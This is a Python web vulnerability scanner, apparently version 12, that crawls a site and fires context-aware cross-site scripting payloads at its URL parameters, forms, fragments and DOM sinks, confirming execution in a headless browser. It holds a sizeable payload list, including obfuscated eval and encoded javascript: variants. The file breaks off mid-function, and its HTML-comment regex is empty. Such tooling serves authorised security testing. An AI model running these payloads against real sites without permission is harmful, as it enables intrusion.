# scanner.py (v12)
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
import argparse
import sys
import time
from collections import deque
import concurrent.futures
import os
import re
import uuid
import copy
import json

# Selenium imports
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.common.exceptions import (
    TimeoutException, UnexpectedAlertPresentException, NoAlertPresentException,
    NoSuchElementException, WebDriverException, JavascriptException
)
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager

# --- Configuration ---
DOM_PAYLOAD_ATTRIBUTE = 'data-xss-success'
DOM_PAYLOAD_VALUE = 'true'
CONFIRMATION_WAIT_TIMEOUT = 3
MAX_WORKERS = 10
UNIQUE_PROBE_PREFIX = "xSsPrObE"
STORED_MARKER_PREFIX = "XSSMARK"
DOM_SINK_MARKER_PREFIX = "DOMSINKMARKER"
STORED_CANDIDATE_PAYLOADS = []
# Limit how many executable payloads we try for DOM confirmation to manage speed
MAX_DOM_CONFIRM_PAYLOADS = 5

# --- Context-Specific Payloads (v10) ---
# (Payload definitions remain the same as v10)
ALERT_EXEC_TPL = "alert('{prefix}_{{marker}}')"
DOM_CHANGE_EXEC = f"document.body.setAttribute('{DOM_PAYLOAD_ATTRIBUTE}','{DOM_PAYLOAD_VALUE}')"
ALERT_CONSTRUCTOR_TPL = "[].constructor.constructor(alert('{prefix}_{{marker}}'))()"
ALERT_PAYLOADS_TPL = [
    f"<script>{ALERT_EXEC_TPL}</script>", f"<ScRiPt>{ALERT_EXEC_TPL}</sCrIpT>", f"<img src=x onerror={ALERT_EXEC_TPL}>",
    f"<iMg sRc=x OnErRoR={ALERT_EXEC_TPL}>", f"<img src=x onerror={ALERT_CONSTRUCTOR_TPL}>", f"<svg onload={ALERT_EXEC_TPL}>",
    f"<SvG OnLoAd={ALERT_EXEC_TPL}>", f"<svg onload={ALERT_CONSTRUCTOR_TPL}>", f"<details open ontoggle={ALERT_EXEC_TPL}><summary>T</summary></details>",
    f"<input autofocus onfocus={ALERT_EXEC_TPL}>", f"<input autofocus OnFoCuS={ALERT_EXEC_TPL}>", f"<a href=\"javascript:{ALERT_EXEC_TPL}\">Click</a>",
    f"<a href=\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;{ALERT_EXEC_TPL}\">Click</a>", f"<body background=\"javascript:{ALERT_EXEC_TPL}\">",
    f"<isindex type=image src=1 onerror={ALERT_EXEC_TPL}>", f"<marquee onstart={ALERT_EXEC_TPL}>XSS</marquee>",
    f"<div style='width:100px;height:100px' onpointerrawupdate={ALERT_EXEC_TPL}>MOVE HERE</div>",
    f"<img src=x onerror=setTimeout('{ALERT_EXEC_TPL}'.replace('{{marker}}','{uuid.uuid4().hex[:4]}'),0)>",
]
DOM_CHANGE_PAYLOADS_STATIC = [
    f"<img src=x onerror=\"{DOM_CHANGE_EXEC}\">", f"<img src=x onerror='{DOM_CHANGE_EXEC}'>", f"<svg onload=\"{DOM_CHANGE_EXEC}\">",
    f"<details open ontoggle=\"{DOM_CHANGE_EXEC}\"><summary>T</summary></details>", f"<input autofocus onfocus=\"{DOM_CHANGE_EXEC}\">",
    f"<div style='width:100px;height:100px' onpointerenter=\"{DOM_CHANGE_EXEC}\">MOVE HERE</div>",
    f"<img src=x onerror=eval(atob('ZG9jdW1lbnQuYm9keS5zZXRBdHRyaWJ1dGUoJ2RhdGEteHNzLXN1Y2Nlc3MnLCd0cnVlJyk='))>",
]
EXECUTION_PAYLOADS_TPL = ALERT_PAYLOADS_TPL + DOM_CHANGE_PAYLOADS_STATIC
def format_payload(payload_template, marker):
    # (Same formatting logic as v10)
    try:
        if "{marker}" in payload_template:
             prefix_match = re.search(r"alert\('([^'_]+)_\{marker\}'\)", payload_template)
             prefix = prefix_match.group(1) if prefix_match else "P"
             return payload_template.replace("{marker}", marker).replace("{prefix}", prefix)
        elif "constructor(alert(" in payload_template:
             prefix_match = re.search(r"alert\('([^'_]+)_\{marker\}'\)", payload_template)
             prefix = prefix_match.group(1) if prefix_match else "C"
             alert_string = f"alert('{prefix}_{marker}')"; return payload_template.replace("alert('{prefix}_{marker}')", alert_string)
        elif "setTimeout(" in payload_template and "{marker}" in payload_template:
             prefix_match = re.search(r"alert\('([^'_]+)_", payload_template); prefix = prefix_match.group(1) if prefix_match else "T"
             return payload_template.replace("{marker}", marker).replace("{prefix}", prefix)
        return payload_template
    except Exception: return payload_template
DEFAULT_PAYLOADS = [format_payload(p, "DEFAULT") for p in EXECUTION_PAYLOADS_TPL]
CONTEXT_PAYLOADS_TPL = {
    "HTML_TEXT": EXECUTION_PAYLOADS_TPL,
    "HTML_ATTR_DQ": [f'">{p}' for p in EXECUTION_PAYLOADS_TPL] + [f'" autofocus onfocus="{ALERT_EXEC_TPL.format(prefix="ATTRDQ")}"', f'"onmouseover="{DOM_CHANGE_EXEC}"', f'" onauxclick="{ALERT_CONSTRUCTOR_TPL.format(prefix="ATTRDQ2")}"'],
    "HTML_ATTR_SQ": [f"'>{p}" for p in EXECUTION_PAYLOADS_TPL] + [f"' autofocus onfocus='{ALERT_EXEC_TPL.format(prefix='ATTRSQ')}'", f"'onmouseover='{DOM_CHANGE_EXEC}'", f"' onauxclick='{ALERT_CONSTRUCTOR_TPL.format(prefix='ATTRSQ2')}'"],
    "HTML_ATTR_UQ": [f" autofocus onfocus={ALERT_EXEC_TPL.format(prefix='ATTRUQ')}", f" onmouseover={ALERT_EXEC_TPL.format(prefix='ATTRUQ2')}", f" onpointerdown={ALERT_CONSTRUCTOR_TPL.format(prefix='ATTRUQ3')}", f" autofocus onfocus={DOM_CHANGE_EXEC}"],
    "SCRIPT_STRING_DQ": [f'";{ALERT_EXEC_TPL.format(prefix="JSDQ")};//', f'";{DOM_CHANGE_EXEC};//', f'";eval(String.fromCharCode(97,108,101,114,116,40,39,74,83,68,81,95,123,109,97,114,107,101,114,125,39,41));//', f'";let x = "{DOM_CHANGE_EXEC}"; eval(x);//'],
    "SCRIPT_STRING_SQ": [f"';{ALERT_EXEC_TPL.format(prefix='JSSQ')};//', f"';{DOM_CHANGE_EXEC};//', f"';eval(String.fromCharCode(97,108,101,114,116,40,39,74,83,83,81,95,123,109,97,114,107,101,114,125,39,41));//', f"';let y = '{DOM_CHANGE_EXEC}'; eval(y);//"],
    "SCRIPT_BLOCK": [f"{ALERT_EXEC_TPL.format(prefix='JSBLK')};", f"{DOM_CHANGE_EXEC};", f"eval(atob('YWxlcnQoJ0pTQkxLX3ttYXJrZXJ9Jyk='));", f"setTimeout('{DOM_CHANGE_EXEC}',0);"],
    "HTML_COMMENT": [f"--><img src=x onerror={ALERT_EXEC_TPL.format(prefix='COMM')}>", f"--><SvG OnLoAd={DOM_CHANGE_EXEC}>"],
    "UNKNOWN": EXECUTION_PAYLOADS_TPL
}

# --- Global list/dict for stored XSS ---
submitted_payloads_log = []
marker_to_submission = {}

# --- Helper Functions ---
# load_payloads, setup_driver, confirm_xss_with_headless, get_links,
# get_forms, get_form_details, analyze_reflection_context
# (Largely unchanged from v10)
def load_payloads(filepath):
    """Loads payloads from a file, one per line."""
    try:
        if not os.path.exists(filepath): print(f"[!] Payload file not found: {filepath}", file=sys.stderr); return None
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
        if not payloads: print(f"[!] No valid payloads found in file: {filepath}", file=sys.stderr); return None
        print(f"[*] Loaded {len(payloads)} payload templates/payloads from {filepath}")
        return payloads
    except IOError as e: print(f"[!] Error reading payload file {filepath}: {e}", file=sys.stderr); return None
    except Exception as e: print(f"[!] Unexpected error loading payload file {filepath}: {e}", file=sys.stderr); return None

def setup_driver():
    """Sets up the Selenium WebDriver."""
    chrome_options = ChromeOptions(); chrome_options.add_argument("--headless"); chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage"); chrome_options.add_argument("--disable-gpu"); chrome_options.add_argument("--log-level=3")
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    try:
        os.environ['WDM_LOG_LEVEL'] = '0'; service = ChromeService(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options); driver.set_page_load_timeout(15); return driver
    except ValueError as ve: print(f"[!] WebDriver Manager Error: {ve}. Check network or cache.", file=sys.stderr); return None
    except WebDriverException as wde: print(f"[!] WebDriver Error during setup: {wde}", file=sys.stderr); return None
    except Exception as e: print(f"[!] Failed to set up Selenium WebDriver: {e}", file=sys.stderr); return None

def confirm_xss_with_headless(url, driver, payload_description=""):
    """Uses Selenium to visit a URL and check for an alert OR specific DOM change. Returns confirmation type and detail (e.g., alert text)."""
    if not driver: return None, None
    confirmation_type = None; confirmation_detail = ""
    try:
        driver.get(url); time.sleep(0.1)
        try: # Alert Check
            WebDriverWait(driver, CONFIRMATION_WAIT_TIMEOUT).until(EC.alert_is_present())
            alert = driver.switch_to.alert; alert_text = alert.text
            confirmation_detail = alert_text; print(f"  [+] CONFIRMED via Alert: Alert('{alert_text}') ({payload_description})")
            alert.accept(); confirmation_type = "Alert"; return confirmation_type, confirmation_detail
        except TimeoutException: pass
        except UnexpectedAlertPresentException:
            try:
                alert = driver.switch_to.alert; alert_text = alert.text
                confirmation_detail = alert_text; print(f"  [+] CONFIRMED via Unexpected Alert: Alert('{alert_text}') ({payload_description})")
                alert.accept(); confirmation_type = "Alert (Unexpected)"; return confirmation_type, confirmation_detail
            except NoAlertPresentException: print("  [!] Alert disappeared before handling.", file=sys.stderr)
        if not confirmation_type: # DOM Check
            try:
                WebDriverWait(driver, 0.5).until(lambda d: d.find_element(By.TAG_NAME, 'body').get_attribute(DOM_PAYLOAD_ATTRIBUTE) == DOM_PAYLOAD_VALUE)
                confirmation_detail = f"Attribute {DOM_PAYLOAD_ATTRIBUTE}={DOM_PAYLOAD_VALUE}"; print(f"  [+] CONFIRMED via DOM Change: {confirmation_detail} ({payload_description})")
                confirmation_type = "DOM Change"; return confirmation_type, confirmation_detail
            except TimeoutException: pass
            except NoSuchElementException: pass
            except Exception as e_dom: print(f"  [!] Error during DOM check: {e_dom}", file=sys.stderr)
        return None, None # Not confirmed
    except TimeoutException: print(f"  [!] Page load timed out during confirmation: {url[:100]}", file=sys.stderr); return None, None
    except WebDriverException as wde:
         if "net::ERR_INVALID_URL" in str(wde): print(f"  [!] Invalid URL generated for confirmation: {url[:100]}", file=sys.stderr)
         return None, None
    except Exception as e: print(f"  [!] Unexpected error during headless confirmation for {url[:100]}: {e}", file=sys.stderr); return None, None

def get_links(url, session, base_domain):
    """Fetches and parses HTML to find all valid links on the same domain."""
    links = set()
    try:
        response = session.get(url, timeout=10); response.raise_for_status()
        content_type = response.headers.get('content-type', '').lower()
        if 'html' not in content_type: return set()
        soup = BeautifulSoup(response.content, 'html.parser')
        for a_tag in soup.find_all('a', href=True):
            href = a_tag['href']
            try:
                if href.strip().lower().startswith('javascript:'): continue
                full_url = urljoin(url, href); parsed_link = urlparse(full_url)
                if parsed_link.scheme in ['http', 'https'] and parsed_link.netloc == base_domain:
                    links.add(parsed_link._replace(fragment='').geturl())
            except ValueError: pass
        return links
    except requests.exceptions.Timeout: print(f"[!] Timeout fetching links from {url}", file=sys.stderr); return set()
    except requests.exceptions.RequestException as e: print(f"[!] Error fetching links from {url}: {e}", file=sys.stderr); return set()
    except Exception as e: print(f"[!] Error parsing links from {url}: {e}", file=sys.stderr); return set()

def get_forms(url, session):
    """Fetches and parses HTML to find all forms."""
    try:
        response = session.get(url, timeout=10); response.raise_for_status()
        content_type = response.headers.get('content-type', '').lower()
        if 'html' not in content_type: return []
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except requests.exceptions.Timeout: print(f"[!] Timeout fetching forms from {url}", file=sys.stderr); return []
    except requests.exceptions.RequestException as e: print(f"[!] Error fetching forms from {url}: {e}", file=sys.stderr); return []
    except Exception as e: print(f"[!] Error parsing forms from {url}: {e}", file=sys.stderr); return []

def get_form_details(form):
    """Extracts details from a form element."""
    details = {}; action = form.attrs.get('action', ''); method = form.attrs.get('method', 'get').lower(); inputs = []
    try:
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_name = input_tag.attrs.get('name');
            if input_name is None: continue
            input_type = input_tag.attrs.get('type', 'text').lower(); input_value = input_tag.attrs.get('value', '')
            if input_tag.name == 'select' and not input_value:
                 option = input_tag.find('option', selected=True);
                 if not option: option = input_tag.find('option')
                 if option: input_value = option.attrs.get('value', option.text)
            inputs.append({'type': input_type, 'name': input_name, 'value': input_value})
    except Exception as e: print(f"[!] Error parsing inputs for a form: {e}", file=sys.stderr)
    details['action'] = action; details['method'] = method; details['inputs'] = inputs; return details

def analyze_reflection_context(html_content, probe):
    """Analyzes HTML to guess the context of the reflected probe string."""
    # (Same basic heuristic logic as v10)
    contexts = set()
    for match in re.finditer(re.escape(probe), html_content):
        start, end = match.span()
        window_start = max(0, start - 80); window_end = min(len(html_content), end + 80)
        window = html_content[window_start:window_end]; probe_in_window_start = start - window_start
        script_match = re.search(r'<script.*?>(.*?)</script>', window, re.IGNORECASE | re.DOTALL)
        if script_match and script_match.start(1) <= probe_in_window_start < script_match.end(1):
            script_content_before_probe = window[script_match.start(1):probe_in_window_start]
            last_dq = script_content_before_probe.rfind('"'); last_sq = script_content_before_probe.rfind("'"); last_nl = script_content_before_probe.rfind('\n')
            last_comment_start = max(script_content_before_probe.rfind('//'), script_content_before_probe.rfind('/*'))
            if last_comment_start > max(last_dq, last_sq, last_nl): contexts.add("SCRIPT_BLOCK")
            elif last_dq > last_sq and last_dq > last_nl: contexts.add("SCRIPT_STRING_DQ" if start > 0 and html_content[start-1] != '\\' else "SCRIPT_BLOCK")
            elif last_sq > last_dq and last_sq > last_nl: contexts.add("SCRIPT_STRING_SQ" if start > 0 and html_content[start-1] != '\\' else "SCRIPT_BLOCK")
            else: contexts.add("SCRIPT_BLOCK")
            continue
        attr_match_dq = re.search(r'([\w:\-]+)\s*=\s*"\s*[^"]*$', html_content[window_start:start])
        attr_match_sq = re.search(r'([\w:\-]+)\s*=\s*\'\s*[^\']*$', html_content[window_start:start])
        attr_match_uq = re.search(r'([\w:\-]+)\s*=\s*([^\s>\'"]*)$', html_content[window_start:start])
        if attr_match_dq and end < len(html_content) and html_content[end:].lstrip().startswith('"'): contexts.add("HTML_ATTR_DQ"); continue
        if attr_match_sq and end < len(html_content) and html_content[end:].lstrip().startswith("'"): contexts.add("HTML_ATTR_SQ"); continue
        if attr_match_uq and end < len(html_content) and re.match(r'[\s/>]', html_content[end:].lstrip()):
             if not html_content[end:].lstrip().startswith("'") and not html_content[end:].lstrip().startswith('"'): contexts.add("HTML_ATTR_UQ"); continue
        comment_match = re.search(r'', window, re.DOTALL)
        if comment_match and comment_match.start() < probe_in_window_start < comment_match.end(): contexts.add("HTML_COMMENT"); continue
        style_match = re.search(r'<style.*?>.*?</style>', window, re.IGNORECASE | re.DOTALL)
        if style_match and style_match.start() < probe_in_window_start < style_match.end(): contexts.add("CSS_BLOCK"); continue
        tag_match = re.search(r'<[\w-]+[^>]*$', html_content[window_start:start])
        if tag_match and end < len(html_content) and html_content[end:].lstrip().startswith('>'): contexts.add("HTML_TAG_DEFINITION"); continue
        if not contexts: contexts.add("HTML_TEXT")
    if not contexts: return ["UNKNOWN"]
    # Prioritization logic
    if "SCRIPT_STRING_DQ" in contexts: return ["SCRIPT_STRING_DQ"]
    if "SCRIPT_STRING_SQ" in contexts: return ["SCRIPT_STRING_SQ"]
    if "SCRIPT_BLOCK" in contexts: return ["SCRIPT_BLOCK"]
    if "HTML_ATTR_DQ" in contexts: return ["HTML_ATTR_DQ"]
    if "HTML_ATTR_SQ" in contexts: return ["HTML_ATTR_SQ"]
    if "HTML_ATTR_UQ" in contexts: return ["HTML_ATTR_UQ"]
    if "HTML_COMMENT" in contexts: return ["HTML_COMMENT"]
    if "CSS_BLOCK" in contexts: return ["CSS_BLOCK"]
    if "HTML_TAG_DEFINITION" in contexts: return ["HTML_TAG_DEFINITION"]
    if "HTML_TEXT" in contexts: return ["HTML_TEXT"]
    return list(contexts)


# --- Functions for Context-Aware Reflected Scanning ---

# task_inject_and_confirm remains the same as v9
def task_inject_and_confirm(url, injection_point_type, param_or_form_details, payload_template, session, driver, log_submission=False):
    """Task: Formats payload with marker, injects, performs confirmation, and optionally logs."""
    test_url = None; final_url = None
    result_base = {'payload_template': payload_template, 'confirmed': False}
    marker = None; formatted_payload = payload_template
    if log_submission:
        marker = f"{STORED_MARKER_PREFIX}_{uuid.uuid4().hex[:8]}"
        formatted_payload = format_payload(payload_template, marker)
        log_entry = {'submit_url': url, 'payload_template': payload_template, 'marker': marker}
        if injection_point_type == 'URL_PARAM': log_entry.update({'context': 'param', 'details': {'name': param_or_form_details['name']}})
        elif injection_point_type == 'FORM':
            log_details = copy.deepcopy(param_or_form_details)
            log_details['injected_fields'] = [inp['name'] for inp in log_details['inputs'] if inp['type'] in ['text', 'search', 'url', 'email', 'tel', 'password', 'textarea', 'hidden']]
            log_entry.update({'context': 'form', 'details': log_details})
        # Use try-except for thread safety if modifying global list directly, or use a queue
        try: submitted_payloads_log.append(log_entry); marker_to_submission[marker] = log_entry
        except Exception as e: print(f"[!] Error logging submission: {e}", file=sys.stderr)
    try:
        if injection_point_type == 'URL_PARAM':
            param_name = param_or_form_details['name']; parsed_url = urlparse(url); query_params = parse_qs(parsed_url.query)
            if param_name not in query_params: return None
            modified_params = query_params.copy(); modified_params[param_name] = [formatted_payload]
            modified_query = urlencode(modified_params, doseq=True); test_url = parsed_url._replace(query=modified_query).geturl()
            response = session.get(test_url, timeout=10, allow_redirects=True); final_url = response.url
            result_base.update({'type': 'URL Parameter', 'url': url, 'parameter': param_name, 'final_url': final_url})
        elif injection_point_type == 'FORM':
            form_details = param_or_form_details; target_url = urljoin(url, form_details['action'])
            inputs = form_details['inputs']; data = {}; tested_fields = []
            for input_item in inputs:
                if not input_item.get('name'): continue
                if input_item['type'] in ['text', 'search', 'url', 'email', 'tel', 'password', 'textarea', 'hidden']:
                    data[input_item['name']] = formatted_payload; tested_fields.append(input_item['name'])
                else: data[input_item['name']] = input_item['value']
            if not tested_fields: return None
            if form_details['method'] == 'post': response = session.post(target_url, data=data, timeout=10, allow_redirects=True)
            else: response = session.get(target_url, params=data, timeout=10, allow_redirects=True)
            final_url = response.url
            result_base.update({'type': 'Form Input', 'url': url, 'action': form_details['action'], 'method': form_details['method'], 'fields': tested_fields, 'final_url': final_url})
        else: return None
        if driver and final_url:
            confirmation_type, confirmation_detail = confirm_xss_with_headless(final_url, driver, payload_description=f"{result_base.get('type','Unknown')} Payload: {formatted_payload[:50]}...")
            if confirmation_type:
                result_base['confirmed'] = True; result_base['confirmation_type'] = confirmation_type; result_base['confirmation_detail'] = confirmation_detail
                result_base['payload'] = formatted_payload; return result_base
        return None
    except requests.exceptions.Timeout: return None
    except requests.exceptions.RequestException: return None
    except Exception as e: print(f"  [!] Error in task_inject_and_confirm for {formatted_payload[:50]}: {e}", file=sys.stderr); return None

# scan_page_reflected_context_aware remains the same as v9
def scan_page_reflected_context_aware(url, session, driver, executor, full_payload_list_templates):
    """Scans for REFLECTED XSS using context analysis and logs potential stored payloads with markers."""
    print(f"[*] Scanning (Context-Aware Reflected) {url}...")
    confirmed_vulnerabilities = []; probe = f"{UNIQUE_PROBE_PREFIX}{uuid.uuid4().hex[:8]}"
    param_probe_results = {}; form_probe_results = {}; form_details_list = []
    # --- 1. Probe Injection Points ---
    parsed_url = urlparse(url); query_params = parse_qs(parsed_url.query); probe_futures = []
    if query_params:
        param_map = {}
        for param_name in query_params.keys():
            if not query_params[param_name]: continue
            future = executor.submit(task_test_url_param, url, param_name, probe, session)
            probe_futures.append(future); param_map[future] = param_name
        for future in concurrent.futures.as_completed(param_map):
             param_name = param_map[future]; probe_result = future.result()
             if probe_result and probe in probe_result.get('response_body', ''): param_probe_results[param_name] = (probe_result['response_body'], probe_result['final_url'])
    probe_futures = []
    forms = get_forms(url, session)
    if forms:
        form_map = {}
        for i, form in enumerate(forms):
            details = get_form_details(form);
            if not details['inputs']: continue
            form_details_list.append(details)
            future = executor.submit(task_test_form, details, url, probe, session)
            probe_futures.append(future); form_map[future] = i
        for future in concurrent.futures.as_completed(form_map):
             form_index = form_map[future]; probe_result = future.result()
             if probe_result and probe in probe_result.get('response_body', ''): form_probe_results[form_index] = (probe_result['response_body'], probe_result['final_url'])
    # --- 2. Analyze Context and Launch Exploit Payloads ---
    exploit_futures = []
    if not driver: print("  [*] Skipping exploit phase as headless browser is disabled."); return []
    processed_probes = 0
    # URL Params Exploitation
    for param_name, (response_body, final_url) in param_probe_results.items():
        processed_probes += 1; contexts = analyze_reflection_context(response_body, probe)
        payload_templates_to_try = set()
        for ctx in contexts: payload_templates_to_try.update(CONTEXT_PAYLOADS_TPL.get(ctx, CONTEXT_PAYLOADS_TPL["UNKNOWN"]))
        param_details = {'name': param_name}
        for payload_template in payload_templates_to_try:
            log_submission = "{marker}" in payload_template
            exploit_futures.append(executor.submit(task_inject_and_confirm, url, 'URL_PARAM', param_details, payload_template, session, driver, log_submission))
    # Forms Exploitation
    for i, (response_body, final_url) in form_probe_results.items():
        processed_probes += 1; form_details = form_details_list[i]; contexts = analyze_reflection_context(response_body, probe)
        payload_templates_to_try = set()
        for ctx in contexts: payload_templates_to_try.update(CONTEXT_PAYLOADS_TPL.get(ctx, CONTEXT_PAYLOADS_TPL["UNKNOWN"]))
        for payload_template in payload_templates_to_try:
             log_submission = "{marker}" in payload_template
             exploit_futures.append(executor.submit(task_inject_and_confirm, url, 'FORM', form_details, payload_template, session, driver, log_submission))
    # --- 3. Collect Confirmed Vulnerabilities ---
    if exploit_futures:
        print(f"[*] Waiting for {len(exploit_futures)} context-aware exploit checks from {processed_probes} reflection points...")
        processed_count = 0
        for future in concurrent.futures.as_completed(exploit_futures):
            processed_count += 1; result = future.result()
            if result and result.get('confirmed'): confirmed_vulnerabilities.append(result)
        print(f"[*] Context-aware exploit checks complete for {url}. Confirmed {len(confirmed_vulnerabilities)} reflected.")
    return confirmed_vulnerabilities


# --- Functions for Advanced DOM XSS Scanning ---

def check_dom_sinks(url, driver, marker):
    """Uses JS execution to check if marker appears in dangerous sinks."""
    # (Same as v11)
    if not driver: return None
    found_in_sink = None
    try:
        body_html = driver.execute_script("return document.body.innerHTML;")
        if marker in body_html:
            # print(f"    [!] Marker '{marker}' found in document.body.innerHTML") # Reduce noise
            found_in_sink = "body.innerHTML"
        marker_json = json.dumps(marker)
        script = f"""
            const marker = {marker_json}; let sinksFound = {{}};
            const tagsToCheck = ['img', 'svg', 'body', 'iframe', 'video', 'audio', 'input', 'details', 'marquee', 'a', 'form']; // Added a, form
            const attrsToCheck = ['onerror', 'onload', 'onmouseover', 'onfocus', 'onclick', 'ontoggle', 'onstart', 'onpageshow', 'onpointerrawupdate', 'onpointerenter', 'onauxclick', 'background', 'action', 'href']; // Added more events/attrs
            tagsToCheck.forEach(tagName => {{
                try {{ // Add try-catch for querySelectorAll errors
                    document.querySelectorAll(tagName).forEach(el => {{
                        attrsToCheck.forEach(attrName => {{
                            if (el.hasAttribute(attrName) && el.getAttribute(attrName).includes(marker)) {{
                                sinksFound[`${{tagName}}[@${{attrName}}]`] = el.getAttribute(attrName).substring(0, 50) + '...'; // Limit length
                            }}
                        }});
                        // Check common sinks like src/href for javascript:
                        if ((tagName === 'a' || tagName === 'iframe' || tagName === 'form') && el.hasAttribute('href') && el.getAttribute('href').toLowerCase().startsWith('javascript:') && el.getAttribute('href').includes(marker)) {{
                             sinksFound[`${{tagName}}[@href=javascript:]`] = el.getAttribute('href').substring(0, 50) + '...';
                        }}
                         if ((tagName === 'img' || tagName === 'iframe' || tagName === 'script') && el.hasAttribute('src') && el.getAttribute('src').toLowerCase().startsWith('javascript:') && el.getAttribute('src').includes(marker)) {{
                             sinksFound[`${{tagName}}[@src=javascript:]`] = el.getAttribute('src').substring(0, 50) + '...';
                        }}
                    }});
                }} catch (e) {{ console.warn(`Error querying ${{{tagName}}}: ${{{e}}}`); }}
            }});
            document.querySelectorAll('script').forEach((script, index) => {{
                try {{
                    if (script.textContent.includes(marker)) {{
                         sinksFound[`script[${{index}}].textContent`] = script.textContent.substring(0, 100) + '...';
                    }}
                }} catch (e) {{ console.warn(`Error checking script[${{{index}}}]: ${{{e}}}`); }}
            }});
            return sinksFound;
        """
        potential_sinks = driver.execute_script(script)
        if potential_sinks:
            print(f"    [!] Marker '{marker}' found in potential DOM sinks: {potential_sinks}")
            if any(k.startswith(('img[','svg[','body[','iframe[','video[','audio[','input[','details[','marquee[','a[','form[')) for k in potential_sinks): found_in_sink = "Attribute Handler / JS URI"
            elif any(k.startswith('script[') for k in potential_sinks): found_in_sink = "Script Content"
            elif not found_in_sink: found_in_sink = "innerHTML (Generic)"
        return found_in_sink
    except JavascriptException as jse: print(f"    [!] JavaScript error during sink check for {url}: {jse}", file=sys.stderr); return None
    except Exception as e: print(f"    [!] Error during DOM sink check for {url}: {e}", file=sys.stderr); return None


# Modified to attempt execution confirmation after sink detection
def scan_dom_source_query(url, driver, executor, payload_template_list):
    """Scans for DOM XSS originating from URL Query Params, checks sinks, then attempts confirmation."""
    if not driver: return []
    print(f"[*] Scanning (DOM XSS via Query Params) {url}...")
    confirmed_vulns = []
    potential_vulns = [] # Store potential findings first
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    base_url = parsed_url._replace(query='').geturl()

    if not query_params: return []

    # --- Step 1: Find potential sinks using markers ---
    potential_params = {} # param_name -> sink_type
    print(f"  [*] Phase 1 (DOM Query): Checking {len(query_params)} params for sink reflection...")
    for param_name in query_params.keys():
        if not query_params[param_name]: continue
        marker = f"{DOM_SINK_MARKER_PREFIX}_{uuid.uuid4().hex[:8]}"
        modified_params = query_params.copy(); modified_params[param_name] = [marker]
        modified_query = urlencode(modified_params, doseq=True)
        test_url_marker = parsed_url._replace(query=modified_query).geturl()

        try:
            driver.get(test_url_marker)
            time.sleep(0.2) # Allow JS processing
            sink_found = check_dom_sinks(test_url_marker, driver, marker)
            if sink_found:
                print(f"    [+] Potential Sink Found: Param '{param_name}' marker reached sink '{sink_found}'")
                potential_params[param_name] = sink_found
        except TimeoutException: print(f"    [!] Timeout navigating for marker check on param '{param_name}'", file=sys.stderr)
        except WebDriverException as e: print(f"    [!] WebDriver error during marker check for param '{param_name}': {e}", file=sys.stderr)
        except Exception as e: print(f"    [!] Error during marker check for param '{param_name}': {e}", file=sys.stderr)

    # --- Step 2: Attempt confirmation for parameters that hit sinks ---
    if not potential_params:
        print(f"  [*] Phase 2 (DOM Query): No potential sinks found for query params.")
        return []

    print(f"  [*] Phase 2 (DOM Query): Attempting execution confirmation for {len(potential_params)} potential params...")
    # Use a limited set of executable payloads for confirmation to save time
    payloads_for_confirm = payload_template_list[:MAX_DOM_CONFIRM_PAYLOADS] # Use first N payloads

    for param_name, sink_type in potential_params.items():
        print(f"    - Confirming param '{param_name}' (Sink Type: {sink_type})...")
        for payload_template in payloads_for_confirm:
             # Format with a unique marker for this confirmation attempt (optional but good practice)
             confirm_marker = f"{STORED_MARKER_PREFIX}_{uuid.uuid4().hex[:8]}"
             executable_payload = format_payload(payload_template, confirm_marker)

             modified_params = query_params.copy()
             modified_params[param_name] = [executable_payload]
             modified_query = urlencode(modified_params, doseq=True)
             test_url_confirm = parsed_url._replace(query=modified_query).geturl()

             confirmation_type, confirmation_detail = confirm_xss_with_headless(test_url_confirm, driver, payload_description=f"DOM Query Confirm: {param_name} / {executable_payload[:40]}...")
             if confirmation_type:
                 # Confirmed Execution!
                 print(f"      [***] CONFIRMED DOM XSS for Param '{param_name}'!")
                 confirmed_vulns.append({
                     'type': 'DOM-based XSS (Confirmed - Query Param)',
                     'url': url,
                     'source': f"Query Parameter ({param_name})",
                     'sink_detected': sink_type, # Add info about the sink found by marker
                     'payload': executable_payload,
                     'payload_template': payload_template,
                     'marker': confirm_marker,
                     'confirmed': True,
                     'confirmation_type': confirmation_type,
                     'confirmation_detail': confirmation_detail,
                     'final_url': test_url_confirm
                 })
                 # Optimization: If one payload confirms for this param, break and move to next param?
                 break # Stop trying payloads for this parameter once confirmed
        # If loop finishes without break, no confirmation for this param


    print(f"[*] DOM XSS Query Param Scan complete for {url}. Confirmed {len(confirmed_vulns)} instances.")
    # Also report potential ones found by marker but not confirmed? Maybe optional.
    # for param_name, sink_type in potential_params.items():
    #     if not any(v['source'] == f"Query Parameter ({param_name})" for v in confirmed_vulns):
    #          potential_vulns.append(...) # Report potential if needed

    return confirmed_vulns # Return only confirmed


# scan_dom_source_hash remains the same as v11
def scan_dom_source_hash(url, driver, payload_template_list):
    """Scans for DOM XSS by injecting formatted payloads into the URL fragment."""
    if not driver: return []
    print(f"[*] Scanning (DOM XSS via Hash) {url}...")
    confirmed_dom_vulns = []; base_url = url.split('#')[0]
    for payload_template in payload_template_list:
        marker = f"{STORED_MARKER_PREFIX}_{uuid.uuid4().hex[:8]}"
        formatted_payload = format_payload(payload_template, marker)
        try:
             encoded_payload = quote(formatted_payload, safe=':/~?=&%')
             test_url = f"{base_url}#{encoded_payload}"
        except Exception as e_quote: print(f"  [!] Error encoding payload for URL hash: {formatted_payload[:50]}... ({e_quote})", file=sys.stderr); continue
        confirmation_type, confirmation_detail = confirm_xss_with_headless(test_url, driver, payload_description=f"Hash Payload: {formatted_payload[:50]}...")
        if confirmation_type:
            extracted_marker = None
